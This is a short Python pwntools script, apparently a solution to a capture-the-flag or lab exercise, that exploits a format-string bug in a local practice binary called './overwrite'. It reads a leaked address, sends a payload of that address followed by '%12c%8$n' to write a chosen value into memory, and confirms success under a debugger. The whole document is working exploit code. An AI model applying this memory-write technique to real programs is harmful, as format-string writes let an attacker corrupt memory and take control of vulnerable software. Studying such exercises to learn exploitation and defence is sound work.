from pwn import *

p = process("./overwrite")
elf = ELF("./overwrite")
gdb.attach(p,"b printf")

a_addr = int(p.recvuntil("\n",drop = True),16)
log.success("a_addr:" + hex(a_addr))

payload = p32(a_addr) + "%12c" + "%8$n"
p.sendline(payload)

info = p.recvline()
if "overwrite a for a regular value" in info:
	log.success("overwrite a successfully")
p.interactive()
